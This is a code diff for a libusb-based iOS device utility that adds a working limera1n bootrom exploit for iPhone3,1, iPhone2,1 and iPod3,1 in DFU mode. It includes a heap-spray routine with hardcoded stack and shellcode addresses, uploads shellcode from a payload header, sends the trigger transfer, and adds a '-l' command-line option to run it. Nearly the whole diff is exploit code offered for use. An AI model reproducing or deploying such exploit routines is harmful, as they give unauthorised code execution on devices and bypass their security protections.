@@ -26,6 +26,8 @@
 #include <readline/history.h>
 #include <libusb-1.0/libusb.h>
 
+#include "limera1n_payload.h"
+
 #define VERSION			"2.0.2"
 #define LIBUSB_VERSION	"1.0"
 #define LIBUSB_DEBUG		0
@@ -464,6 +466,95 @@ int device_exploit(char* payload) {
 	return 0;
 }
 
+void dfu_notify_upload_finshed() {
+	int i, ret = libusb_control_transfer(device, 0x21, 1, 0, 0, 0, 0, 100);
+	for (i = 0; i < 3; i++) {
+		unsigned char status[6];
+		ret = libusb_control_transfer(device, 0xA1, 3, 0, 0, status, 6, 100);
+	}
+	libusb_reset_device(device);
+}
+
+int device_limera1n(const char *devicename) {
+	unsigned int i = 0;
+	unsigned char buf[0x800];
+	unsigned char shellcode[0x800];
+	unsigned int max_size = 0x24000;
+	unsigned int stack_address = 0;
+	unsigned int shellcode_address = 0;
+	unsigned int shellcode_length = 0;
+
+	if (devicemode != WTF_MODE) {
+		printf("Put device in DFU mode.\n");
+		return -1;
+	}
+
+	if (!strcmp(devicename, "iPhone3,1")) {
+		max_size = 0x2C000;
+		stack_address = 0x8403BF9C;
+		shellcode_address = 0x8402B001;
+	} else if (!strcmp(devicename, "iPhone2,1")) {
+		max_size = 0x24000;
+		stack_address = 0x84033FA4;
+		shellcode_address = 0x84023001;
+	} else if (!strcmp(devicename, "iPod3,1")) {
+		max_size = 0x24000;
+		stack_address = 0x84033F98;
+		shellcode_address = 0x84023001;
+	} else {
+		printf("Unsupported device %s. Can't exploit with limera1n.\n", devicename);
+		return -1;
+	}
+
+	memset(shellcode, 0x0, 0x800);
+	shellcode_length = sizeof(limera1n_payload);
+	memcpy(shellcode, limera1n_payload, sizeof(limera1n_payload));
+
+	printf("Resetting device counters\n");
+	libusb_control_transfer(device, 0x21, 4, 0, 0, 0, 0, USB_TIMEOUT);
+
+	memset(buf, 0xCC, 0x800);
+	for(i = 0; i < 0x800; i += 0x40) {
+		unsigned int* heap = (unsigned int*)(buf+i);
+		heap[0] = 0x405;
+		heap[1] = 0x101;
+		heap[2] = shellcode_address;
+		heap[3] = stack_address;
+	}
+
+	printf("Sending chunk headers\n");
+	libusb_control_transfer(device, 0x21, 1, 0, 0, buf, 0x800, 1000);
+
+	memset(buf, 0xCC, 0x800);
+	for(i = 0; i < (max_size - (0x800 * 3)); i += 0x800) {
+		libusb_control_transfer(device, 0x21, 1, 0, 0, buf, 0x800, 1000);
+	}
+
+	printf("Sending exploit payload\n");
+	libusb_control_transfer(device, 0x21, 1, 0, 0, shellcode, 0x800, 1000);
+
+	printf("Sending fake data\n");
+	memset(buf, 0xBB, 0x800);
+	libusb_control_transfer(device, 0xA1, 1, 0, 0, buf, 0x800, 1000);
+	libusb_control_transfer(device, 0x21, 1, 0, 0, buf, 0x800, 10);
+
+	//printf("Executing exploit\n");
+	libusb_control_transfer(device, 0x21, 2, 0, 0, buf, 0, 1000);
+
+	device_reset();
+	dfu_notify_upload_finshed();
+	printf("Exploit sent\n");
+
+	printf("Reconnecting to device\n");
+	sleep(2);
+	device_close();
+	if ((device = libusb_open_device_with_vid_pid(NULL, VENDOR_ID, devicemode = WTF_MODE)) == NULL) {
+		printf("Cannot reconnect to WTF mode\n");
+	}
+
+	return 0;
+}
+
 int device_sendrawusb0xA1(char *command) {
 
 	printf("[Device] Sending raw command to 0xA1, x, 0, 0, 0, 0, 1000.\n");
@@ -517,6 +608,7 @@ void prog_usage() {
 	printf("\t-x21 <command>\tsend a raw command to 0x21.\n");
 	printf("\t-x40 <command>\tsend a raw command to 0x41.\n");
 	printf("\t-xA1 <command>\tsend a raw command to 0xA1.\n");
+	printf("\t-l <dev>\texploit with limera1n (iPhone3,1 or iPhone2,1 or iPod3,1).\n");
 	printf("\n");
 	printf("== Console / Batch Commands ==\n");
 	printf("\n");
@@ -948,6 +1040,11 @@ void prog_handle(int argc, char *argv[]) {
 			device_exploit(argv[2]);
 		else
 			device_exploit(NULL);
+
+	} else if(! strcmp(argv[1], "-l")) {
+
+		if(argc >= 3)
+			device_limera1n(argv[2]);
 
 	} else if (! strcmp(argv[1], "-s")) {
 
